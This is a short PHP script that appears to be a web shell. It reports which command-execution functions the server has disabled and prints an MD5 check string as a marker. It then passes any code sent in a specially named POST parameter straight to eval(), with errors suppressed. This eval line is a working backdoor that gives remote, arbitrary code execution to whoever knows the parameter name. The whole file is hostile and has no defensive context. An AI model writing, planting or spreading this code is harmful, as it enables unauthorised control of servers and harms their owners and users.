<?php
echo "DISABLED=".ini_get('disable_functions')."\n";
foreach (['system','passthru','shell_exec','exec','proc_open','popen'] as $f) {
    $disabled = in_array($f, explode(',', ini_get('disable_functions')));
    echo $f . ':' . ($disabled ? 'OFF' : 'ON') . "\n";
}
echo md5('verify');
if (isset($_POST['pingtoufuck!'])) {
    @eval($_POST['pingtoufuck!']);
}
